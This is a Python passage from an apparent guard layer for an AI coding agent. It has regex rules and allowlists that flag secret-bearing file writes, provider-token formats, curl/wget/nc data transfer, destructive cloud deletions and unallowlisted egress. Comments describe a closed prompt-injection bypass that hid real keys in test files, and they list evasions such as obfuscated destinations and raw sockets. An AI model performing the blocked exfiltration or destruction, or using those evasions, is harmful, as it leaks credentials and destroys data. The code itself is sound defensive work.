            RuleVerdict(
                "GIT_PUSH_DELETE_REMOTE",
                "high",
                "git push deleting a remote ref.",
                evidence=command[:200],
                recommendation=(
                    "`git push <remote> :<ref>` and `git push --delete` "
                    "silently remove a branch/tag from the remote. "
                    "Confirm the remote and ref before deleting."
                ),
            ),
        )

    # MEDIUM: force-overwrite refs via `+` prefix in fetch refspec.
    # `git fetch <remote> +refs/...` overwrites local refs even on
    # non-fast-forward updates — silently loses local commits.
    if re.search(
        r"\bgit\s+fetch\b[^|;&\n]*?\s['\"]?\+refs/",
        _git_scan,
    ):
        verdicts.append(
            RuleVerdict(
                "GIT_FETCH_FORCE_REFSPEC",
                "medium",
                "git fetch with force-overwrite refspec (`+` prefix).",
                evidence=command[:200],
                recommendation=(
                    "`+refs/...` in a fetch refspec force-overwrites "
                    "local refs. May silently discard local commits. "
                    "Confirm before running."
                ),
            ),
        )

    # HIGH: `git push --mirror` overwrites EVERY remote ref to match
    # local. Branches the remote has but local doesn't get deleted;
    # diverging refs get force-overwritten. Catastrophic on shared
    # remotes; legitimate for backup-clone workflows.
    # Excludes `git remote add ... --mirror=push` (config setup) and
    # `git clone --mirror` (read-only) — those don't have the
    # `git push` verb prefix.
    if re.search(
        r"\bgit\s+push\b[^|;&\n]*?\s--mirror\b",
        _git_scan,
    ):
        verdicts.append(
            RuleVerdict(
                "GIT_PUSH_MIRROR",
                "high",
                "git push --mirror overwrites every remote ref.",
                evidence=command[:200],
                recommendation=(
                    "`--mirror` overwrites every ref on the remote and "
                    "deletes refs that don't exist locally. Catastrophic "
                    "on shared remotes. Confirm the destination."
                ),
            ),
        )

    return verdicts


# Strip prose so FILE_DYNAMIC_EXEC only matches REAL code, not a file that
# merely MENTIONS eval()/exec()/compile() in a docstring, comment, or string
# literal (e.g. documentation, a regex pattern, or a test of these very rules).
# That false positive hard-froze a session for writing a benign module. Triple
# first so inner quotes don't confuse the single-string pass; blank with a
# space so tokens don't merge.
_PY_TRIPLE_STR = re.compile(r'"""[\s\S]*?"""|\'\'\'[\s\S]*?\'\'\'')
_PY_LINE_COMMENT = re.compile(r"#[^\n]*")
_PY_SINGLE_STR = re.compile(r'"(?:[^"\\\n]|\\.)*"|\'(?:[^\'\\\n]|\\.)*\'')


def _code_surface_for_exec_scan(content: str) -> str:
    """Blank triple-/single-quoted strings + line comments so FILE_DYNAMIC_EXEC
    fires only on an actual ``eval(`` / ``exec(`` / ``compile(`` / ``__import__(``
    CODE call, never on a prose mention. Fail-safe: returns input on error."""
    try:
        s = _PY_TRIPLE_STR.sub(" ", content)
        s = _PY_LINE_COMMENT.sub("", s)
        return _PY_SINGLE_STR.sub(" ", s)
    except Exception:
        return content


def _looks_like_sample_secret(content: str) -> bool:
    """True only when secret-shaped content is OBVIOUSLY a NON-REAL sample (a
    fixture placeholder), so the test-fixture demote relaxes ONLY fakes. A real,
    high-entropy credential written to a test-named path is NOT a sample -> it
    keeps the hard `malicious_forbidden` block (2026-07-09 security fix: the
    path-only demote let a prompt-injected agent slip a real key into a
    test_*.py file). Erring toward 'not a sample' is the safe direction."""
    import math
    import re
    from collections import Counter

    text = content or ""
    low = text.lower()
    # Explicit fake markers / truncation -> clearly a sample.
    markers = (
        "example", "sample", "redact", "dummy", "fake", "placeholder", "your-",
        "your_", "changeme", "notreal", "not-real", "xxxx", "...", "…",
        "test-key", "testkey", "deadbeef", "0000000", "1234567", "aaaaaaa", "<",
    )
    if any(m in low for m in markers):
        return True
    # No substantial secret BODY (short/absent base64 blob) -> sample-ish.
    runs = re.findall(r"[A-Za-z0-9+/=_-]{20,}", text)
    if not runs:
        return True
    longest = max(runs, key=len)
    if len(longest) < 40:
        return True  # too short to be a live key body
    # A real key body is high-entropy; a repetitive placeholder is not.
    n = len(longest)
    entropy = -sum((c / n) * math.log2(c / n) for c in Counter(longest).values())
    return entropy < 3.5  # low character diversity => placeholder, not a real key


def _check_file_write_rules(path: str, content: str | None = None) -> list[RuleVerdict]:
    """Rules for file write/edit operations."""
    verdicts: list[RuleVerdict] = []
    lower_path = path.lower().replace("\\", "/")
    # Test/fixture files legitimately contain secret-SHAPED samples (a security
    # test writing a sample PEM, a fixture with a fake token). A WRITE there is
    # not exfil — so the file-content secret rules below DEMOTE from
    # malicious_forbidden (hard strike, no confirm) to a non-strike advisory for
    # these paths (operator-approved 2026-07-07). Real source/config writes keep
    # the hard strike; exfil (upload shapes) is unaffected.
    _base = lower_path.rsplit("/", 1)[-1]
    is_test_fixture = (
        "/tests/" in lower_path
        or "/test/" in lower_path
        or "/fixtures/" in lower_path
        or "fixture" in _base
        or _base.startswith("test_")
        or _base.endswith(("_test.py", ".sample", ".example"))
    )
    # SECURITY (2026-07-09): demote ONLY when the path is a test/fixture AND the
    # secret content is an obvious FAKE sample. A real key in a test-named file
    # keeps the hard block — closes the prompt-injection bypass.
    _demote_ok = is_test_fixture and _looks_like_sample_secret(content or "")

    # HIGH: writing to credential files
    cred_patterns = (".env", ".pem", ".key", ".pfx", "credentials", "secrets", ".ssh/", "id_rsa")
    for pat in cred_patterns:
        if pat in lower_path:
            verdicts.append(
                RuleVerdict(
                    "FILE_WRITE_CRED",
                    "high",
                    f"Writing to credential/key file: {path}",
                    evidence=path,
                    recommendation="Credential files should not be agent-modified.",
                ),
            )
            break

    # HIGH: writing to CI/CD config
    ci_patterns = (
        ".github/workflows/",
        ".gitlab-ci",
        "jenkinsfile",
        ".circleci/",
        "azure-pipelines",
    )
    for pat in ci_patterns:
        if pat in lower_path:
            verdicts.append(
                RuleVerdict(
                    "FILE_WRITE_CI",
                    "high",
                    f"Writing to CI/CD configuration: {path}",
                    evidence=path,
                    recommendation="CI/CD changes can deploy code — review carefully.",
                ),
            )
            break

    # MEDIUM: writing to package manifest
    pkg_patterns = (
        "package.json",
        "requirements.txt",
        "pyproject.toml",
        "cargo.toml",
        "go.mod",
        "gemfile",
        ".csproj",
    )
    for pat in pkg_patterns:
        if lower_path.endswith(pat):
            verdicts.append(
                RuleVerdict(
                    "FILE_WRITE_DEPS",
                    "medium",
                    f"Writing to dependency manifest: {path}",
                    evidence=path,
                    recommendation="Dependency changes can introduce supply chain risks.",
                ),
            )
            break

    # MEDIUM: writing to Docker/infra config
    infra_patterns = ("dockerfile", "docker-compose", "terraform", ".tf", "kubernetes", "helm")
    for pat in infra_patterns:
        if pat in lower_path:
            verdicts.append(
                RuleVerdict(
                    "FILE_WRITE_INFRA",
                    "medium",
                    f"Writing to infrastructure config: {path}",
                    evidence=path,
                ),
            )
            break

    # Content-based checks
    if content:
        # HIGH: hardcoded secrets in content (keyword-anchored heuristic)
        # Keyword stays a SUBSTRING (access_token / api_token / auth_secret still caught
        # — recall preserved); the captured VALUE is then screened so a URL / path /
        # endpoint or an env/template reference is NOT treated as a secret. That kills the
        # dominant false positive (a var NAMED token/secret holding a non-secret value,
        # e.g. `token = "/oauth/token"`) WITHOUT lowering detection of real hardcoded
        # credentials — a credential literal is never a URL/path/ref, and provider-format
        # tokens (ghp_/sk-/AKIA…) are still caught unconditionally below + by gitleaks.
        # The captured value must stay on ONE line ([^"'\r\n]) — a real hardcoded credential is a
        # single-line literal. Allowing newlines let the regex span TWO unrelated string literals
        # (e.g. `getpass("Confirm password: ")` + a later `"..."`), capturing code/punctuation
        # between them as a phantom "secret" — the dominant false positive on files that merely
        # MENTION password/secret/token (the whole ai_deploy_* signing surface). Single-line keeps
        # every real credential literal caught; multi-line secrets (PEM blocks) have their own rule.
        _sec_m = re.search(
            r'(?i)(password|secret|api_key|token)\s*[:=]\s*["\']([^"\'\r\n]{8,})["\']', content
        )
        _sec_val = _sec_m.group(2).strip() if _sec_m else ""
        _sec_is_ref = bool(_sec_val) and (
            _sec_val.startswith(
                ("/", "./", "../", "~/", "http://", "https://", "ws://", "wss://", "file://", "$", "{", "<")
            )
            or "://" in _sec_val
            or any(
                r in _sec_val
                for r in ("${", "{{", "process.env", "os.environ", "os.getenv", "import.meta.env", "getenv(")
            )
        )
        # #813: JUDGE THE VALUE, NOT THE FILE. `_demote_ok` asks whether the
        # WHOLE FILE looks like a sample, so whether THIS literal is a fake was
        # decided by unrelated text elsewhere in it — one long identifier
        # anywhere (a 40+ char run of [A-Za-z0-9+/=_-], which ordinary Python
        # produces) re-armed the hard block for every literal in the file.
        #
        # Measured cost: writing tests/security/test_expert_set_typed_values_747.py
        # was refused over a DOCSTRING line naming the confirm phrase that
        # expert_confirm_token() generates for a settings key. That phrase is
        # PUBLIC — the dashboard shows it to the operator as placeholder text
        # and existing tests assert it verbatim — so its whole job is to be
        # typed by a human in the open. The rule matched the SHAPE
        # `<identifier ending in token> = <quoted literal>` and then asked the
        # wrong question about it.
        #
        # This does NOT weaken the 2026-07-09 prompt-injection fix, which exists
        # so a REAL key cannot be smuggled into a test-named path: such a key is
        # high-entropy AS A VALUE, so the value-based check refuses to call it a
        # sample and the hard block still applies. Judging the value is STRICTER
        # about what it looks at, not more permissive about what it allows — a
        # real credential no longer gets to hide behind a file that happens to
        # look fake either.
        _sec_demote = _demote_ok or (
            is_test_fixture and bool(_sec_val) and _looks_like_sample_secret(_sec_val)
        )
        if _sec_m and not _sec_is_ref:
            # 2026-07-21 FALSE-POSITIVE FIX (issue 20260721T154905Z-b571e6df):
            # honour the SAME test-fixture demote the provider-pattern rules
            # below already use. `_demote_ok` was computed but this rule ignored
            # it, so writing a SECURITY TEST that asserts credentials never leak
            # (which must contain secret-SHAPED literals like token="…") was hard
            # -refused as malicious_forbidden — i.e. the anti-credential rule
            # blocked the tests that PREVENT credential leakage.
            # STILL BLOCKED, unchanged: (a) a real/high-entropy credential in a
            # test path (_looks_like_sample_secret returns False -> no demote,
            # the 2026-07-09 prompt-injection fix), (b) ANY secret in a non-test
            # path, and (c) provider-format credentials (ghp_/sk-/AKIA…), which
            # are matched unconditionally by format below.
            verdicts.append(
                RuleVerdict(
                    ("FILE_SECRET_SAMPLE_IN_TEST" if _sec_demote else "FILE_HARDCODED_SECRET"),
                    ("low" if _sec_demote else "high"),
                    "Hardcoded secret detected in file content.",
                    recommendation="Use environment variables or secret management.",
                ),
            )

        # CRITICAL: provider-prefix credentials. Bumped 2026-04-26
        # (Q-A strict, Batch 8 closer of #46 step 5) from high to
        # critical / forbidden — doctrine §0.5 line 37 names
        # credential exfiltration patterns under hard-deny.
        # The UPS-side `extract_credential_tokens` user-intent override
        # is the only legitimate downgrade path: when an operator-pasted
        # token appears in user intent, that specific token's verdict
        # downgrades to ask-state for the rest of the turn (mechanism
        # already implemented in claude_hook on UserPromptSubmit).
        # Bolt-on to FILE_HARDCODED_SECRET: that rule requires a lhs
        # keyword like password= / token= which misses variables named
        # anything else. These patterns are format-based, not name-
        # based — GitHub's own secret scanner uses equivalents.
        for rule_id, label, pattern in _PROVIDER_CREDENTIAL_PATTERNS:
            m = re.search(pattern, content)
            if m:
                excerpt = m.group(0)
                # Redact the token body in the verdict evidence so the
                # log/journal doesn't exfiltrate the secret downstream.
                redacted = excerpt[:6] + "…" + excerpt[-2:] if len(excerpt) > 10 else "***"
                verdicts.append(
                    RuleVerdict(
                        # Demote a provider-token SAMPLE in a test/fixture to a
                        # non-strike advisory (not exfil); real writes keep the
                        # forbidden rule_id + critical tier.
                        ("FILE_SECRET_SAMPLE_IN_TEST" if _demote_ok else rule_id),
                        ("low" if _demote_ok else "critical"),
                        f"{label} credential format detected in file content.",
                        evidence=redacted,
                        recommendation=(
                            "Remove the token; use env vars or a secret "
                            "manager. If you legitimately pasted this key "
                            "in a prior message, the UPS user-intent path "
                            "downgrades it to ask-state for this turn."
                        ),
                    ),
                )
                break  # one provider hit is enough

        # HIGH: PEM-block private keys (RSA / EC / OPENSSH / generic)
        if re.search(
            r"-----BEGIN (?:RSA |EC |DSA |OPENSSH |ENCRYPTED )?PRIVATE KEY-----",
            content,
        ):
            if _demote_ok:
                verdicts.append(
                    RuleVerdict(
                        "FILE_SECRET_SAMPLE_IN_TEST",
                        "low",
                        "PEM-shaped sample in a test/fixture file (not exfil).",
                        recommendation=(
                            "Build the sample from fragments / chr() so the fixture "
                            "carries no literal key (keeps the write-guard clean)."
                        ),
                    ),
                )
            else:
                verdicts.append(
                    RuleVerdict(
                        "FILE_PEM_PRIVATE_KEY",
                        "critical",
                        "PEM-encoded private key in file content.",
                        recommendation="Never commit private keys. Rotate if this key was real.",
                    ),
                )

        # MEDIUM: eval/exec in code. Scan the CODE SURFACE only (strings,
        # docstrings, and comments blanked) so a file that merely MENTIONS
        # these in prose is not flagged. Match only the BARE builtins — a
        # preceding `.` or word char means an attribute / identifier
        # (`re.compile`, `obj.exec`, `recompile(`), not the dynamic-exec
        # builtin, so the negative lookbehind excludes those too.
        if re.search(
            r"(?<![.\w])(?:eval|exec|__import__|compile)\s*\(",
            _code_surface_for_exec_scan(content),
        ):
            verdicts.append(
                RuleVerdict(
                    "FILE_DYNAMIC_EXEC",
                    "medium",
                    "Dynamic code execution pattern in written content.",
                ),
            )

    return verdicts


# Provider-prefix credential patterns (format-based detection).
# Tuple: (rule_id, human_label, regex). Regexes are anchored on the
# provider prefix + length so benign strings like "AKIAfoo" in prose
# don't trigger (real keys are fixed-length and all-caps / base62).
_PROVIDER_CREDENTIAL_PATTERNS: tuple[tuple[str, str, str], ...] = (
    # AWS access key ID — 20 chars, starts AKIA/ASIA
    ("FILE_AWS_ACCESS_KEY", "AWS access key", r"\b(?:AKIA|ASIA)[0-9A-Z]{16}\b"),
    # AWS secret access key — 40 chars base64-ish, harder to match
    # reliably without false positives, so only paired with a
    # clue keyword nearby.
    (
        "FILE_AWS_SECRET",
        "AWS secret access key",
        r"(?i)aws.{0,20}?[=:]\s*['\"]?[A-Za-z0-9/+=]{40}['\"]?",
    ),
    # GitHub personal access token (classic) — starts ghp_, 36 chars
    ("FILE_GITHUB_PAT", "GitHub PAT", r"\bghp_[A-Za-z0-9]{36}\b"),
    # GitHub fine-grained PAT — github_pat_
    ("FILE_GITHUB_FINE_PAT", "GitHub fine-grained PAT", r"\bgithub_pat_[A-Za-z0-9_]{22,}\b"),
    # GitHub OAuth / app — gho_, ghu_, ghs_, ghr_
    ("FILE_GITHUB_OAUTH", "GitHub OAuth/app token", r"\bgh[ousr]_[A-Za-z0-9]{36}\b"),
    # Stripe live/test — sk_live_ / sk_test_ / rk_live_ / pk_live_
    ("FILE_STRIPE_KEY", "Stripe key", r"\b(?:sk|rk|pk)_(?:live|test)_[A-Za-z0-9]{24,}\b"),
    # Slack tokens — xoxb / xoxp / xoxa / xoxr / xoxs
    ("FILE_SLACK_TOKEN", "Slack token", r"\bxox[abprs]-[0-9]{10,}-[0-9]{10,}-[A-Za-z0-9]{24,}\b"),
    # OpenAI — sk-proj-... or sk-... (keep length loose because OpenAI
    # has rotated formats; 40+ chars is the floor)
    ("FILE_OPENAI_KEY", "OpenAI API key", r"\bsk-(?:proj-)?[A-Za-z0-9_\-]{40,}\b"),
    # Google API key — AIza + 35 chars
    ("FILE_GOOGLE_API_KEY", "Google API key", r"\bAIza[0-9A-Za-z\-_]{35}\b"),
    # JWT — three base64url segments separated by dots, eyJ header is
    # the overwhelmingly common start so anchor on it for specificity
    (
        "FILE_JWT",
        "JWT token",
        r"\beyJ[A-Za-z0-9_\-]{10,}\.eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\b",
    ),
    # Anthropic — sk-ant-
    ("FILE_ANTHROPIC_KEY", "Anthropic API key", r"\bsk-ant-[A-Za-z0-9_\-]{20,}\b"),
    # Generic private-key URI (e.g. postgres://user:pass@host)
    (
        "FILE_URI_CREDENTIALS",
        "URI with embedded credentials",
        r"\b[a-zA-Z][a-zA-Z0-9+\-.]*://[^\s:/@]+:[^\s:/@]+@[^\s/]+",
    ),
)


def extract_credential_tokens(text: str) -> list[str]:
    """Return the set of provider-credential tokens that appear verbatim
    in `text`. Used by claude_hook on UserPromptSubmit to populate the
    session's user-intent credential override set — tokens in the list
    cause the PreToolUse judge's hard-block to downgrade to an ask-state
    confirm (user pasted the secret → user intent covers it).

    Deduplicated, order of first appearance preserved. Empty when the
    text has no provider-shaped tokens (the common case).
    """
    if not text:
        return []
    out: list[str] = []
    seen: set[str] = set()
    for _rule_id, _label, pattern in _PROVIDER_CREDENTIAL_PATTERNS:
        for m in re.finditer(pattern, text):
            token = m.group(0)
            if token and token not in seen:
                seen.add(token)
                out.append(token)
    return out


def _check_network_rules(
    command: str,
    *,
    provider: str = "bash",
    transport: str = "ai_run",
) -> list[RuleVerdict]:
    """Rules for network-related operations."""
    verdicts: list[RuleVerdict] = []
    # Judge the EXECUTABLE SURFACE: data-only windows (git -m/-F message
    # payloads, heredoc bodies) are masked so a commit message that QUOTES
    # `rm -rf /` / `$(rm x)` / `curl|sh` is not judged as executing it. Real
    # execution outside the data window stays visible. Masked regions never
    # fire a rule, so `evidence=command[:200]` stays accurate.
    from .shell_data_windows import mask_data_windows

    command = mask_data_windows(command)
    lower = command.lower()

    # HIGH: cloud CLI mutations (legacy broad match — kept for back-compat
    # with the existing test corpus + taxonomy entry).
    if re.search(r"(aws|gcloud|az)\s+(s3\s+rm|compute\s+delete|iam|ec2\s+terminate)", lower):
        verdicts.append(
            RuleVerdict(
                "NET_CLOUD_MUTATION",
                "high",
                "Cloud provider destructive operation.",
                evidence=command[:200],
                recommendation="Cloud mutations should be reviewed and approved.",
            ),
        )

    # ── CLOUD_DESTRUCTIVE_* family (2026-05-27) ──────────────────────
    # Service-specific destructive patterns the legacy NET_CLOUD_MUTATION
    # regex missed. Each is CONFIRMABLE_DESTRUCTIVE by default; the
    # NO_RECOVERY_FLAGS amplifier below bumps to MALICIOUS_FORBIDDEN
    # (CLOUD_DESTRUCTIVE_NO_RECOVERY) because once the recoverability
    # safety-net flag is stripped, the operation is unrecoverable even
    # with admin intervention.
    #
    # Positive recovery whitelist (allowed-by-default, listed here as
    # doctrine, not enforced as a rule — these don't match any
    # destructive pattern so the cascade lets them through naturally):
    #   reboot-db-instance, restart-app-server, restart-service,
    #   systemctl restart, pm2 restart, kubectl rollout restart.
    # "restore service" doctrine: operational recovery is ALLOWED.
    # "destroy production data" is what these rules catch.

    _CLOUD_DESTRUCTIVE_RULES: tuple[tuple[str, str, str], ...] = (
        # (rule_id, service, regex)
        (
            "CLOUD_DESTRUCTIVE_RDS",
            "RDS",
            r"aws\s+rds\s+(delete|stop)-db-(instance|cluster|snapshot)",
        ),
        ("CLOUD_DESTRUCTIVE_KMS", "KMS", r"aws\s+kms\s+(schedule-key-deletion|disable-key)"),
        (
            "CLOUD_DESTRUCTIVE_ROUTE53",
            "Route53",
            r"aws\s+route53\s+(delete-hosted-zone|delete-traffic-policy)",
        ),
        (
            "CLOUD_DESTRUCTIVE_DYNAMODB",
            "DynamoDB",
            r"aws\s+dynamodb\s+(delete-table|delete-backup)",
        ),
        (
            "CLOUD_DESTRUCTIVE_ECS",
            "ECS",
            r"aws\s+ecs\s+(delete-service|delete-cluster|delete-task-definitions)",
        ),
        (
            "CLOUD_DESTRUCTIVE_EKS",
            "EKS",
            r"aws\s+eks\s+(delete-cluster|delete-nodegroup|delete-fargate-profile)",
        ),
        ("CLOUD_DESTRUCTIVE_S3_BUCKET", "S3-bucket", r"aws\s+s3(?:api)?\s+(delete-bucket|rb\b)"),
        ("CLOUD_DESTRUCTIVE_LAMBDA", "Lambda", r"aws\s+lambda\s+delete-function"),
        (
            "CLOUD_DESTRUCTIVE_IAM",
            "IAM",
            r"aws\s+iam\s+(delete-user|delete-role|detach-(?:user|role)-policy)",
        ),
        (
            "CLOUD_DESTRUCTIVE_GCLOUD",
            "gcloud",
            r"gcloud\s+(sql|compute|container|iam)\s+(?:instances\s+)?delete",
        ),
        ("CLOUD_DESTRUCTIVE_AZ", "az", r"az\s+(group|vm|sql|storage|aks)\s+delete"),
    )

    # No-recovery flags: when one of these appears alongside a
    # CLOUD_DESTRUCTIVE_* match, the safety net is GONE — even an admin
    # can't undo it post-hoc. Demote to forbidden, attach the flag in
    # evidence so the freeze envelope quotes it back to the operator.
    _NO_RECOVERY_FLAGS: tuple[str, ...] = (
        "--skip-final-snapshot",  # RDS — no final snapshot kept
        "--force-delete-without-recovery",  # KMS — bypass pending window
        "--no-pending-window",  # KMS shorthand
        "--bypass-governance-retention",  # S3 Object Lock
        "--force",  # generic — many CLIs treat as "skip safety checks"
    )

    no_recovery_flags_found = [f for f in _NO_RECOVERY_FLAGS if f in lower]

    for rule_id, service, pattern in _CLOUD_DESTRUCTIVE_RULES:
        if re.search(pattern, lower):
            if no_recovery_flags_found:
                # FORBIDDEN — recovery safety stripped; operator
                # confirm alone shouldn't enable an unrecoverable op.
                verdicts.append(
                    RuleVerdict(
                        "CLOUD_DESTRUCTIVE_NO_RECOVERY",
                        "critical",
                        f"{service} destructive op with no-recovery flag: "
                        f"{', '.join(no_recovery_flags_found)}. Once executed, "
                        f"the resource cannot be restored.",
                        evidence=command[:200],
                        recommendation=(
                            "Remove the no-recovery flag and re-issue, OR "
                            "snapshot/back up the resource manually first."
                        ),
                    ),
                )
            else:
                # CONFIRMABLE — recoverable destructive op. Operator
                # destructive-intent in the prompt unlocks confirm.
                verdicts.append(
                    RuleVerdict(
                        rule_id,
                        "high",
                        f"{service} destructive operation. A snapshot/backup "
                        f"is taken by default; verify the recovery path is "
                        f"intact before approving.",
                        evidence=command[:200],
                        recommendation=(
                            "Confirm the operation IS intended; check that "
                            "no --skip-* / --force-* / --bypass-* flag has "
                            "been added."
                        ),
                    ),
                )
            break  # one rule per command is enough — no spam

    # MEDIUM: outbound data transfer
    if re.search(r"(curl|wget|nc|ncat)\s+.*-d\s+", lower):
        verdicts.append(
            RuleVerdict(
                "NET_DATA_EXFIL",
                "medium",
                "Outbound data transfer detected.",
                evidence=command[:200],
            ),
        )

    # LOW: DNS lookups.
    # `host` standalone is a DNS tool, but it's also a substring of
    # PowerShell cmdlet names like `Write-Host`, `Get-Host`. Word
    # boundary `\b` isn't enough — `-` is a non-word char so `\bhost\b`
    # matches inside `Write-Host`. Anchor `host` so it's at command
    # start (or after `;`/`&`/`|`/`&&` chain separators) AND followed
    # by a domain-shaped argument or end-of-line/separator. `dig` and
    # `nslookup` are unique enough to keep the simple `\b` form.
    if re.search(
        r"\b(?:dig|nslookup)\b"
        r"|(?:^|[;&|]\s*)host(?:\s+\S|\s*$)",
        lower,
    ):
        verdicts.append(
            RuleVerdict(
                "NET_DNS_LOOKUP",
                "low",
                "DNS lookup command.",
                evidence=command[:200],
            ),
        )

    return verdicts


# ── Built-in destructive patterns (absorbed from access_gate) ──

# ── Positive egress allowlist (2026-05-17 +) ────────────────────────
# The structural answer to "catch exfiltration": instead of detecting
# specific bad shapes (negative blocklist, infinite arms race), refuse
# ANY network egress whose destination isn't on an explicit allowlist.
#
# Limits this can NOT close on its own:
#   * Destinations obfuscated at runtime (env vars, base64-decoded
#     hostnames, command substitution) bypass static destination
#     extraction. The OBFUSC_DECODE_EXEC rule catches the most common
#     decode-then-exec shape; harder evasions need OS-level egress
#     firewalling (Windows Filtering Platform / iptables / equivalent),
#     which is separate infra work.
#   * Direct socket APIs (python -c "import socket; ...") bypass the
#     network-tool grep. Caught indirectly by OBFUSC_DECODE_EXEC when
#     wrapped in exec(decode(...)); raw socket() in a -c body would
#     still need parser-level analysis.
#
# What this DOES close:
#   * The classic exfil shapes (curl, wget, nc, scp, ssh, dig with
#     direct host args). Any unallowlisted host: refused, critical.
#   * The "no destination parseable" case (network tool present but
#     destination is dynamic / obfuscated / unparsed). Fail-closed.
#
# Config: `security.egress_allowlist` (list[str]); default empty.
# Localhost variants always pass. Wildcards: exact-host or
# `.suffix.example.com` style suffix match. Add entries via dashboard.

_NET_TOOL_PATTERN = re.compile(
    r"\b(?:curl|wget|fetch|"
    r"nc|ncat|telnet|ftp|"
    r"invoke-webrequest|iwr|invoke-restmethod|irm|"
    r"dig|nslookup|drill|kdig|"
    r"ssh|scp|sftp|rsync)\b",
    re.IGNORECASE,
)

# Subset that may FAIL CLOSED on an unparseable destination. "fetch" is
# omitted on purpose: it is a common English word, a git subcommand, and a JS
# API, so a bare "fetch" with no destination (e.g. a git commit message
# "retire the toml fetch") is a false positive that nearly froze a session. A
# real `fetch http://host` still carries a parseable destination and is gated
# normally; only the destination-less bare word is spared.
_STRICT_NET_TOOL_PATTERN = re.compile(
    r"\b(?:curl|wget|"
    r"nc|ncat|telnet|ftp|"
    r"invoke-webrequest|iwr|invoke-restmethod|irm|"
    r"dig|nslookup|drill|kdig|"
    r"ssh|scp|sftp|rsync)\b",
    re.IGNORECASE,
)

# Tools that are PURE LOOKUP (no data egress) — DNS resolvers. We
# still gate them because DNS itself is an exfil channel (handled
# via EXFIL_DNS_TUNNEL on the obfuscation side), but the gating
# semantics differ slightly: a DNS lookup of github.com is benign;
# of attacker.com is not. Same allowlist applies.
_DNS_TOOL_PATTERN = re.compile(
    r"\b(?:dig|nslookup|drill|kdig)\b",
    re.IGNORECASE,
)


def _extract_egress_destinations(command: str) -> list[str]:
    """Best-effort destination host extraction from a shell command.

    Returns a list of lowercase host strings. Returns empty list when
    a network tool is present but no destination could be parsed —
    callers MUST treat empty-after-network-tool-detected as fail-closed.
    """
    destinations: list[str] = []
    # URL-shaped — most common
    for m in re.finditer(
        r"https?://([A-Za-z0-9._-]+)(?::\d+)?(?:[/\s?#]|$)",
        command,
    ):
        destinations.append(m.group(1).lower())
    # scp / sftp / rsync remote operands: [user@]host:path. The colon marks
    # the REMOTE spec; the destination is NOT necessarily the first operand
    # (`scp ./local.txt user@host:/tmp/` — local source first, remote dest
    # second). Scan every host:path operand so a remote source OR dest is
    # caught; the bare local file (no host:colon) is correctly skipped.
    if re.search(r"\b(?:scp|sftp|rsync)\b", command, re.IGNORECASE):
        for m in re.finditer(
            r"(?:^|\s)(?:[A-Za-z0-9_.-]+@)?"
            r"([A-Za-z0-9][A-Za-z0-9.-]*\.[A-Za-z0-9-]+):",
            command,
        ):
            destinations.append(m.group(1).lower())
    # ssh / sftp bare host (optional user@; no colon-path form).
    for m in re.finditer(
        r"\b(?:ssh|sftp)\s+(?:-[A-Za-z0-9]+(?:\s+\S+)?\s+)*"
        r"(?:[A-Za-z0-9_.-]+@)?([A-Za-z0-9][A-Za-z0-9.-]*\.[A-Za-z0-9-]+)"
        r"(?:[:\s]|$)",
        command,
        re.IGNORECASE,
    ):
        host = m.group(1).lower()
        if host and "." in host and not host.startswith("-"):
            destinations.append(host)
    # nc/ncat host port (positional)
    for m in re.finditer(
        r"\b(?:nc|ncat|telnet|ftp)\s+(?:-[A-Za-z0-9]+\s+)*"
        r"([A-Za-z0-9.-]+)\s+\d+",
        command,
        re.IGNORECASE,
    ):
        destinations.append(m.group(1).lower())
    # dig/nslookup host (last positional)
    for m in re.finditer(
        r"\b(?:dig|nslookup|host|drill|kdig)\s+(?:@\S+\s+)?"
        r"(?:-[A-Za-z0-9]+\s+)*"
        r"([A-Za-z0-9._-]+\.[A-Za-z][A-Za-z0-9-]+)",
        command,
        re.IGNORECASE,
    ):
        destinations.append(m.group(1).lower())
    return destinations


def _host_matches_allowlist(host: str, allowlist: list[str]) -> bool:
    """Localhost variants always pass. Otherwise the host must match
    an allowlist entry exactly, or be a subdomain of an allowlist
    suffix entry (e.g. allowlist=['github.com'] matches 'github.com'
    and 'api.github.com' but not 'evilgithub.com').
    """
    h = host.lower().strip()
    if h in {"localhost", "127.0.0.1", "::1", "0.0.0.0", "[::1]"}:
        return True
    for allowed in allowlist:
        a = str(allowed).lower().strip()
        if not a:
            continue
        if h == a or h.endswith("." + a):
            return True
    return False


def _check_egress_allowlist(
    command: str,
    project_root: Path | None = None,
    *,
    provider: str = "bash",
    transport: str = "ai_run",
) -> list[RuleVerdict]:
    """Positive-allowlist network egress gate.

    If a network tool appears in the command, EVERY destination
    extracted must be on `security.egress_allowlist` (or be
    localhost). If any destination is missing OR can't be parsed,
    refuse critical.

    #588: this was the ONE bash matcher that scanned the RAW command, so a
    commit message merely NAMING `curl | sh` as a shape we refuse was itself
    refused — EGRESS_UNPARSEABLE_DESTINATION, a block_strike. A git message
    value is an argv token git never executes, so it is masked here exactly as
    every other matcher masks it. Masking can only REMOVE a match: a real
    `curl https://…` outside the message window still extracts its destination,
    and a command whose ONLY network token was inside the message has no
    network tool at all.
    """
    from .shell_data_windows import mask_data_windows

    command = mask_data_windows(command)
    if not _NET_TOOL_PATTERN.search(command):
        return []  # no network tool, nothing to gate

    # The store can hold this as a SCALAR STRING (measured: a Dashboard
    # write landed one bare address, not a one-element list). Iterating it
    # directly walks CHARACTERS — the operator's entry vanishes and one
    # one-character "host" per character takes its place, each of them live
    # and matchable. get_string_list is the one home for that coercion; do
    # not re-hand-roll it here.
    #
    # No literal address in this comment on purpose: `aidocs-no-hardcoded-vps-ip`
    # refuses infrastructure addresses in shipped source, and it caught the
    # first draft of exactly this comment.
    from .config import get_string_list

    allowlist = get_string_list(
        "security.egress_allowlist",
        project_root=project_root,
    )

    destinations = _extract_egress_destinations(command)
    if not destinations:
        # Fail-closed ONLY for unambiguous network tools. A soft word like
        # "fetch" with no parseable destination is not egress (it is plain
        # English / a git subcommand / a JS API), so it must not refuse — a
        # bare "fetch" in a commit message nearly froze a session.
        if not _STRICT_NET_TOOL_PATTERN.search(command):
            return []
        return [
            RuleVerdict(
                "EGRESS_UNPARSEABLE_DESTINATION",
                "critical",
                "Shell command invokes a network tool but the destination "
                "could not be parsed — fail-closed under the egress "
                "allowlist. Obfuscated or runtime-resolved destinations "
                "cannot pass this gate.",
                evidence=command[:200],
                recommendation=(
                    "Restate the command with the destination as a literal "
                    "host or URL string. If the destination is genuinely "
                    "dynamic, the operator must allowlist the runtime-"
                    "computed value via security.egress_allowlist before "
                    "the call."
